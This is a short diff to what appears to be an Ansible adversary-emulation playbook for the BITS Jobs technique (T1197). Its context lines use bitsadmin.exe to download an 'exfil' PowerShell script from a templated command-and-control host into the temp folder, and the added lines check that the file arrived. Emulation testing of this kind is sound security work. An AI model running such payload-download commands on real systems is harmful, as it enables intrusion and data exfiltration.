@@ -7,3 +7,7 @@
           - name: Download payload
             tags: always
             win_command: bitsadmin.exe  /transfer /Download /priority Foreground https://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} %TEMP%\bitsadmin_flag.ps1
+          - name: Check Payload downloaded
+            tags: always
+            win_command: type %TEMP%\bitsadmin_flag.ps1
+            register: T1197
